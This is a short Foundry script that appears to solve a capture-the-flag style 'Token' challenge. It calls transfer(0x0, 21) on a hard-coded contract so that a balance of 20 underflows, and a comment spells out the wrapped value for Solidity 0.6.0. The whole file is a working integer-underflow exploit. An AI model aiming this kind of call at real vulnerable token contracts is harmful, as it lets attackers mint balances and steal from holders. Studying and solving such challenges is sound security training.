// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Interface} from "../../src/06_Token/Interface.sol";
import "forge-std/console.sol";

contract CounterScript is Script {
    function setUp() public {}

    function run() public 
    {
        Interface i;
        i = Interface(0x59a4CEECe6909fcAaFe5AFF97A8ACaA7d267850E);
        vm.startBroadcast();
        i.transfer(address(0x0), 21);
        vm.stopBroadcast();
    }
}
/*
0.6.0-> underflow possible
20-21 = 115792089237316195423570985008687907853269984665640564039457584007913129639935


*/